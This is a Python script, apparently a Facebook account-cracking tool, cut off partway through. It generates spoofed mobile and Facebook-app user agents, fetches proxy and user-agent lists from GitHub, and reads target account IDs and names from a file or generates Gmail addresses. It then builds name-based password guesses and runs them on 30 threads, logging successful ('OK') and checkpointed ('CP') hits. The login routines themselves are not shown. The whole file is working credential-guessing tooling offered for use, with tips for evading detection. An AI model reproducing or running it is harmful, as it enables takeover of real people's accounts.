#----------(MAIN:IMPORT)---------#
import bs4,json,os,sys,random,datetime,time,re,requests,httpx
import urllib3,rich,base64,string,uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
#-----------------(USER-AGENT)------------------#
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-C900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.1534.112 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/352..0.0.7.110;FBDM/DisplayMetrics{density=1.875, width=720, height=1457,1.875, scaledDensity=1.875, xdpi=268.941, ydpi=269.139 , densityDpi=563, noncompatWidthPixels=720, noncompatDensityDpi=1457, noncompatXdpi=403.411, noncompatYdpi=407.095};]",]
#-----------------(GLOBAL-PROXY)------------------#
ugen2=[]
ugen=[]
ugen3=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox=open('.prox.txt','r').read().splitlines()
except Exception as e:
    prox= requests.get('https://raw.githubusercontent.com/Pro-Max-420/Api/main/prox.txt').text
    open('.prox.txt','w').write(prox)
    prox=open('.prox.txt','r').read().splitlines()
#-----------------(UA-STATEMANT)------------------#
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    samsung = random.choice(["SM-J200F", "SM-J200G", "SM-J200H", "SM-J200GU", "SM-J200M", "SM-J200Y", "SM-A556V", "SM-A556U", "SM-A556U1", "SM-A556B", "SM-A556B", "SM-A556E", "SM-A556E", "SM-A5560", "SM-A205F", "SM-A205FN", "SM-A205U", "SM-A205GN", "SM-A205YN", "SM-A205G", "SM-A205W", "SM-A205F", "SM-A205FN", "SM-A205GN", "SM-A205YN", "SM-A205G", "SM-A205W", "SM-A205U", "SM-A205S", "SM-S205DL", "SM-A205U1", "SM-A405F", "SM-A405FN", "SM-A405FM", "SM-A405S", "SM-A920F", "SM-A9200", "SM-A920N", "SM-A920X", "SM-A505F", "SM-A505FN", "SM-A505GN", "SM-A505G", "SM-A505FM", "SM-A505YN", "SM-A505W", "SM-A505X", "SM-A505U", "SM-A505GT", "SM-A505U1", "SM-A505G", "SM-A505N", "SM-S506DL", "SM-E225F", "SM-E225F"])
    aa=f'Mozilla/5.0 (Linux; Android 10; {samsung})'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uuaa = "[FBAN/EMA;FBLC/en_US;FBAV/"+str(random.randint(111,999))+"..0.0."+str(random.randint(1,99))+"."+str(random.randint(100,444))+";FBDM/DisplayMetrics{density=1.875, width=720, height=1457,1.875, scaledDensity=1.875, xdpi=268.941, ydpi=269.139 , densityDpi=563, noncompatWidthPixels=720, noncompatDensityDpi=1457, noncompatXdpi=403.411, noncompatYdpi=407.095};]"
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 10; XT1789-05)'
    b=random.choice(['6','7','8','9','10','11','12'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uuaa = "[FBAN/EMA;FBLC/en_US;FBAV/"+str(random.randint(111,999))+"..0.0."+str(random.randint(1,99))+"."+str(random.randint(100,444))+";FBDM/DisplayMetrics{density=1.875, width=720, height=1457,1.875, scaledDensity=1.875, xdpi=268.941, ydpi=269.139 , densityDpi=563, noncompatWidthPixels=720, noncompatDensityDpi=1457, noncompatXdpi=403.411, noncompatYdpi=407.095};]"
    uaku3=f'{aa} {b}; moto z 2) {g}{h}.{i}.{j}.{k} {l}{uuaa}'
    ugen3.append(uaku3)

#------------------(API_UA)---------------#
pompom = requests.get('https://raw.githubusercontent.com/SHISHIR-143/R/main/model.txt').text.splitlines()
ugen5=[]
for smxd in range(50000):
    a1 = "Mozilla/5.0 (Linux; Android "
    b1 = str(random.randint(7,14))
    c1 = "; "
    d1 = random.choice(pompom)
    extra = random.choice(["SKQ1","UKQ1","TKQ1","UP1A","TP1A","NMF26F","UKQ1","SP1A","LRX21M","SP1A"])
    e1 = f" Build/{extra}.{str(random.randint(200000,299999))}.001"
    f1 = "; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
    g1 = "Chrome/"
    h1 = random.randrange(73,100)
    i1 = ".0."
    j1 = random.randrange(4200,4900)
    k1 = random.randrange(40,150)
    l1 = f"Mobile Safari/537.{str(random.randint(15,36))} JsSdk/2 NewsArticle/"
    m1 = f"{str(random.randint(7,9))}.{str(random.randint(1,9))}.0 NetType/wifi"
    uamu = f"{a1}{b1}{c1}{d1}{e1}{f1}{g1}{h1}{i1}{j1}.{k1} {l1}{m1}"
    ugen5.append(uamu)

def m3_ua():
    samsung = random.choice(["SM-J200F", "SM-J200G", "SM-J200H", "SM-J200GU", "SM-J200M", "SM-J200Y", "SM-A556V", "SM-A556U", "SM-A556U1", "SM-A556B", "SM-A556B", "SM-A556E", "SM-A556E", "SM-A5560", "SM-A205F", "SM-A205FN", "SM-A205U", "SM-A205GN", "SM-A205YN", "SM-A205G", "SM-A205W", "SM-A205F", "SM-A205FN", "SM-A205GN", "SM-A205YN", "SM-A205G", "SM-A205W", "SM-A205U", "SM-A205S", "SM-S205DL", "SM-A205U1", "SM-A405F", "SM-A405FN", "SM-A405FM", "SM-A405S", "SM-A920F", "SM-A9200", "SM-A920N", "SM-A920X", "SM-A505F", "SM-A505FN", "SM-A505GN", "SM-A505G", "SM-A505FM", "SM-A505YN", "SM-A505W", "SM-A505X", "SM-A505U", "SM-A505GT", "SM-A505U1", "SM-A505G", "SM-A505N", "SM-S506DL", "SM-E225F", "SM-E225F"])
    uab = '[FBAN/FB4A;FBAV/'+str(random.randint(10,200))+'.0.0.'+str(random.randint(1000,2999))+';FBBV/'+str(random.randint(1000000,2999999))+';[FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/'+samsung+';FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]'
    uac = '[FBAN/Orca-Android;FBAV/378.0.0.67.84;FBPN/com.facebook.orca;FBLC/en_US;FBBV/366691894;FBCR/3ITA;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 10 Lite;FBSV/10;FBCA/x86:armeabi-v7a;FBDM/{density=2.8125,width=1080,height=2208};]'
    uad = '[FBAN/Orca-Android;FBAV/133.0.0.59.88;FBPN/com.facebook.orca;FBLC/en_US;FBBV/310330937;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/X430;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=1920};]'
    ua = random.choice([uab,uac,uad])
    return ua

def m4_ua():
    samsung = random.choice(["SM-J200F", "SM-J200G", "SM-J200H", "SM-J200GU", "SM-J200M", "SM-J200Y", "SM-A556V", "SM-A556U", "SM-A556U1", "SM-A556B", "SM-A556B", "SM-A556E", "SM-A556E", "SM-A5560", "SM-A205F", "SM-A205FN", "SM-A205U", "SM-A205GN", "SM-A205YN", "SM-A205G", "SM-A205W", "SM-A205F", "SM-A205FN", "SM-A205GN", "SM-A205YN", "SM-A205G", "SM-A205W", "SM-A205U", "SM-A205S", "SM-S205DL", "SM-A205U1", "SM-A405F", "SM-A405FN", "SM-A405FM", "SM-A405S", "SM-A920F", "SM-A9200", "SM-A920N", "SM-A920X", "SM-A505F", "SM-A505FN", "SM-A505GN", "SM-A505G", "SM-A505FM", "SM-A505YN", "SM-A505W", "SM-A505X", "SM-A505U", "SM-A505GT", "SM-A505U1", "SM-A505G", "SM-A505N", "SM-S506DL", "SM-E225F", "SM-E225F"])
    uaa = '[FBAN/FB4A;FBAV/'+str(random.randint(10,200))+'.0.0.'+str(random.randint(1000,2999))+';FBBV/'+str(random.randint(1000000,2999999))+';[FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/'+samsung+';FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]'
    uab = '[FBAN/FB4A;FBAV/'+str(random.randint(10,200))+'.0.0.'+str(random.randint(1000,2999))+';FBBV/'+str(random.randint(1000000,2999999))+';[FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/X430;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=1920};]'
    uac = '[FBAN/Orca-Android;FBAV/378.0.0.67.84;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/366691894;FBCR/3ITA;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 10 Lite;FBSV/10;FBCA/x86:armeabi-v7a;FBDM/{density=2.8125,width=1080,height=2208};]'
    uad = '[FBAN/Orca-Android;FBAV/133.0.0.59.88;FBPN/com.facebook.orca;FBLC/en_US;FBBV/310330937;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/X430;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=1920};]'
    uae = '[FBAN/Orca-Android;FBAV/432.0.0.39.118;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/316408629;FBCR/CHEN PHONE IDEA;FBMF/jakumagirpula;FBBD/jakumagirpula;'+f'FBDV/MAGINO{str(random.randint(1700,4000))};'+'FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=1920};]'
    ua = random.choice([uaa,uab,uac,uad,uae])
    return ua
kgf_ua = requests.get('https://raw.githubusercontent.com/KGF-420/ua/main/kgfua.txt').text.splitlines()
def mx_ua():
     really=random.choice(kgf_ua)
     return really
 
def useragenttx():
        usr1=random.randrange(111,999)
        usr2='.0.0.'
        usr3=random.randrange(1111,9999)
        usr=f'{random.randrange(111,999)}.0.0.{random.randrange(1111,9999)}'
        rxxx=f"SM-{str(random.choice(['A','J','F','M','S']))}{str(random.randint(10,999))}"
        ua=f'[FBAN/FB4A;FBAV/{usr};FBBV/3408781;[FBAN/FB4A;FBAV/248.1.0.44.116;FBBV/184540683;FB'+'DM/{density=2.0,width=720,height=1260};FBLC/en_GB;'+'FBRV/0;FBCR/Airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.malte;FBDV/'+str(rxxx)+';FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
        return ua
#---------------(INDICATION)---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------(COLOUR)--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
###----------(ANSII-COLOR-STYLE)---------- ###

Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
###----------(RICH COLOR STYLE)---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
#------------------(CNV-BLN)--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
sorfy = time.strftime("%H:%M")
ghonta,minitx=sorfy.split(':')
ghonta=ghonta.replace('00','12')
real_time=str(ghonta)+":"+str(minitx)+" "+str(tag)
#----------------(LOGO)----------------#
logo=(f"""\x1b[1;92m ___ _  _ ____    _  _ ____ ____ ___
  |  |__| |___ __ |\ | |  | |  | |__] 
  |  |  | |___    | \| |__| |__| |__]
\x1b[38;5;27m{42*'—'}\x1b[38;5;46m
\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m DE"""+"""VE"""+"""LOPER \x1b[0m:⁠\x1b[38;5;46m SH"""+"""IS"""+"""HI"""+"""R A"""+"""H"""+"""M"""+"""ED\n\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m FA"""+"""CE"""+"""BOO"""+"""K"""+"""  \x1b[0m:⁠\x1b[38;5;46m SH"""+"""IS"""+"""HIR"""+"""-1"""+f"""43
\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m VERSION   \x1b[0m:\x1b[38;5;160m (\x1b[38;5;38mVOLUME/2.3\x1b[0m\x1b[38;5;160m)\n\x1b[38;5;27m{42*'—'}\x1b[38;5;46m""");menu=(f"\x1b[38;5;46m\x1b[38;5;160m[\x1b[1;32m1\x1b[38;5;160m]\x1b[38;5;46m C"+"R"+"E"+"A"+"K F"+"I"+"L"+"E B"+"D"+"+"+"I"+"N"+"D \n\x1b[38;5;160m[\x1b[1;32m2\x1b[38;5;160m]\x1b[38;5;46m C"+"O"+"N"+"T"+"U"+"C"+"T A"+"D"+"M"+"I"+"N\n[0] E"+"X"+"I"+"T M"+"E"+"N"+f"U\n\x1b[38;5;27m{42*'—'}\x1b[38;5;46m");paid=(f"\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m YOUR K"+"E"+"Y"+" N"+"O"+"T A"+"P"+"P"+"R"+"O"+"V"+"E"+"D"+f"..... \n\x1b[38;5;27m{42*'—'}\x1b[38;5;46m")
def clear():os.system('clear');print(logo)
def linex():print(f"\x1b[38;5;27m{42*'—'}\x1b[38;5;46m")
def approval(key):
    clear()
    print("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m KEY : "+key)
    linex()
    input("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m P"+"R"+"E"+"E"+"S E"+"N"+"T"+""+"E"+"R F"+"O"+"R S"+"E"+"N"+"D K"+"E"+"Y ")
    os.system('xdg-open https://www.facebook.com/profile.php?id=100090907149850')
#-----------------(MAIN-MENU)------------------#
def menu():
    clear()
    print("\x1b[38;5;160m[\x1b[1;32m1\x1b[38;5;160m]\x1b[38;5;46m File Cloning Menu")
    print("\x1b[38;5;160m[\x1b[1;32m2\x1b[38;5;160m]\x1b[38;5;46m Random Cloning")
    print("\x1b[38;5;160m[\x1b[1;32m3\x1b[38;5;160m]\x1b[38;5;46m Exit Program")
    linex()
    xdcj = input("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Select One : ")
    if xdcj in ["1","01","a","A"]:
        crack_file()
    elif xdcj in ['2','02','b','B']:
        crack_randm()
    else:menu()
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
    clear()
    print('\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Example : /sdcard/noob.txt ')
    linex()
    o = input(f"\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Put File Path : ")
    try:lin = open(o).read().splitlines()
    except:
        linex()
        print('\x1b[38;5;160m[\x1b[0m×\x1b[38;5;160m]\x1b[38;5;46m File Not Found ....')
        time.sleep(2)
        crack_file()
    for xid in lin:
        id.append(xid)
    setting()
#-------------(PENGATURAN-IDZ)---------------#
def setting():
    for bacot in id:
       xx = random.randint(0,len(id2))
       id2.insert(xx,bacot)
    clear()
    psswd=[]
    ppxx=[]
    print("\x1b[38;5;160m[\x1b[1;32m1\x1b[38;5;160m]\x1b[38;5;46m Default Pass Bangladesh")
    print("\x1b[38;5;160m[\x1b[1;32m2\x1b[38;5;160m]\x1b[38;5;46m Custom Password")
    linex()
    mmd=input("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Select One : ")
    if mmd in ['1','01','a','A']:
       psswd.append('default')
    else:
       psswd.append('choice')
       clear()
       try:
          mmki=int(input("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Enter Pas Limit : "))
       except:
          mmki=8
       clear()
       print("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Example : first last first12 last@@ ")
       linex()
       for xxcc in range(mmki):
           ppxx.append(input(f"\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Enter Pas {xxcc+1} : "))
           linex()
    clear()
    print("\x1b[38;5;160m[\x1b[1;32m1\x1b[38;5;160m]\x1b[38;5;46m Method A Working")
    print("\x1b[38;5;160m[\x1b[1;32m2\x1b[38;5;160m]\x1b[38;5;46m Method B Working")
    print("\x1b[38;5;160m[\x1b[1;32m3\x1b[38;5;160m]\x1b[38;5;46m Method C Updated")
    print("\x1b[38;5;160m[\x1b[1;32m4\x1b[38;5;160m]\x1b[38;5;46m Method D Updated")
    print("\x1b[38;5;160m[\x1b[1;32m5\x1b[38;5;160m]\x1b[38;5;46m Method E All Work")
    linex()
    hc = input('\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Select Method : ')
    if hc in ['1','01','a','A']:
        method.append('M1')
    elif hc in ['2','02','b','B']:
        method.append('M2')
    elif hc in ['3','03','c','C']:
        method.append('M3')
    elif hc in ['4','04','d','D']:
        method.append('M4')
    elif hc in ['5','05','E','e']:
        method.append('M5')
    else:
        method.append('M1')
    passwrd(psswd,ppxx)
    exit()
#---------------(BEGIN-WRDLST)----------------#
def passwrd(psswd,ppxx):
    os.system('clear')
    print(logo)
    sorfy = time.strftime("%H:%M")
    ghonta,minitx=sorfy.split(':')
    ghonta=ghonta.replace('00','12')
    real_time=str(ghonta)+":"+str(minitx)+" "+str(tag)
    print(f"\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Total Uid : {str(len(id))} \x1b[38;5;202m>\x1b[38;5;46m {method[0]} \x1b[38;5;160m|\x1b[38;5;46m {real_time}")
    print("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Use Fake Apn Or [\x1b[0mOn\x1b[38;5;46m/\x1b[0mOff\x1b[38;5;46m] Air Mode ")
    linex()
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            try:last = nmf.split(' ')[1]
            except:last = nmf
            pwv = []
            if 'default' in psswd:
               if len(frs)<3:
                   pwv.append(last+'12');pwv.append(last+'123');pwv.append(last+'1234');pwv.append(last+'12345');pwv.append(last+'123456');pwv.append(nmf);pwv.append('i love you');pwv.append(last+'@143');pwv.append(last+'@');pwv.append(last+'@@');pwv.append(last+'@@@');pwv.append(last+'@@@@');pwv.append(last+'@#');pwv.append(last+'1122');pwv.append(last+'11');pwv.append(last+'111')
                   pwv.append(last+'@12');pwv.append(last+'@123');pwv.append(last+'@1234');pwv.append(last+'@123456');pwv.append(last+'@12345');pwv.append(last+'007');pwv.append(last+'@#$');pwv.append(last+'786');pwv.append(last+'987');pwv.append(last+'567')
               else:
                   pwv.append(frs+'12');pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12345');pwv.append(frs+'123456');pwv.append(nmf);pwv.append('i love you');pwv.append(frs+'@143');pwv.append(frs+'@');pwv.append(frs+'@@');pwv.append(frs+'@@@');pwv.append(frs+'@@@@');pwv.append(frs+'@#');pwv.append(frs+'1122');pwv.append(frs+'11');pwv.append(frs+'111')
                   pwv.append(frs+'@12');pwv.append(frs+'@123');pwv.append(frs+'@1234');pwv.append(frs+'@123456');pwv.append(frs+'@12345');pwv.append(frs+'007');pwv.append(frs+'@#$');pwv.append(frs+'786');pwv.append(frs+'987');pwv.append(frs+'567')
            elif 'choice' in psswd:
                  for pplo in ppxx:
                     if len(frs)<3:
                        frs=last
                     if len(last)<3:
                        try:last=nmf.split(' ')[2]
                        except:pass
                        last=nmf
                     xmxs=str(pplo.replace('first',frs).replace('last',last).replace('name',nmf))
                     pwv.append(xmxs)
            else:
               exit('\x1b[38;5;160m[\x1b[38;5;46m×\x1b[38;5;160m] \x1b[38;5;46mSOMETHING WRONG ....')
            if 'M1' in method:
                pool.submit(crack,idf,pwv)
            elif 'M2' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'M3' in method:
                pool.submit(creakup,idf,pwv)
            elif 'M4' in method:
                pool.submit(creakbst,idf,pwv)
            elif 'M5' in method:
                pool.submit(creaksexy,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print("")
    linex()
    print(f'\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m The Process Has Been Completed...')
    print(f'\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Total Ok/Cp : {ok}/{cp}')
    linex()
    input(f"\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m PRESS ENTER TO EXIT ")
    exit()
#--------------------(RANDOM)------------------#
def crack_randm():
    clear()
    print("\x1b[38;5;160m[\x1b[1;32m1\x1b[38;5;160m]\x1b[38;5;46m Gmail Cloning")
    print("\x1b[38;5;160m[\x1b[1;32m2\x1b[38;5;160m]\x1b[38;5;46m Number Clone")
    linex()
    xxvv = input("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Select One : ")
    if xxvv in ['1','01','a','A']:
        gmail()
    elif xxvv in ['2','02','b','B']:
        number()
    else:crack_randm()
#------------------(GMAIL)-------------------#
def gmail():
    clear()
    print("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Example : abir sami riyad sadiya ")
    linex()
    first = input("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m ENTER FIRST NAME : ")
    clear()
    print("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Example : hassan khan islam ")
    linex()
    last = input("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Enter Last Name : ")
    clear()
    print("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Example : @gmail.com Etc... ")
    linex()
    domain = input("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Enter Domain : ")
    clear()
    print("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Example : 2000 4000 7000 10000 ")
    linex()
    try:limit = int(input("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Enter Limit : "))
    except:limit = 5000
    clear()
    print("\x1b[38;5;160m[\x1b[1;32m1\x1b[38;5;160m]\x1b[38;5;46m Method A b-graph")
    print("\x1b[38;5;160m[\x1b[1;32m2\x1b[38;5;160m]\x1b[38;5;46m Method B skip-api")
    linex()
    nnjjkhh = input("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m SELECT : ")
    if nnjjkhh in ["a","A","01","1"]:mhhtd="M1"
    elif nnjjkhh in ["B","b","02","2"]:mhhtd="M2"
    else:mhhtd="M2"
    listests = ['3','4']
    os.system('rm -rf .gm.txt')
    for xxcb in range(limit):
       lchoice = random.choice(listests)
       if '3' in lchoice:
           mail = ''.join(random.choice(string.digits) for _ in range(3))
           open('.gm.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
       else:
           mail = ''.join(random.choice(string.digits) for _ in range(4))
           open('.gm.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
           fo = open('.gm.txt', 'r').read().splitlines()
    with tred(max_workers=30) as gmail:
           tl = str(len(fo))
           clear()
           print(f"\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m NAME : {first} {last} \x1b[38;5;202m>\x1b[38;5;46m {tl}")
           print("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m USE FAKE APN OR \x1b[38;5;160m[\x1b[38;5;228mON\x1b[0m/\x1b[38;5;202mOFF\x1b[38;5;160m]\x1b[38;5;46m AIR MODE ")
           linex()
           for user in fo:
              idf,names = user.split('|')
              first_name = names.rsplit(' ')[0]
              try:
                  last_name = names.rsplit(' ')[1]
              except IndexError:
                  last_name = 'Ahmed'
              fs = first_name.lower()
              ls = last_name.lower()
              pwv = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'143',fs+'12',fs+'@@',fs+'@@@@']
              if "M1" in mhhtd:
                  gmail.submit(tuki,idf,pwv,tl)
              elif "M2" in mhhtd:
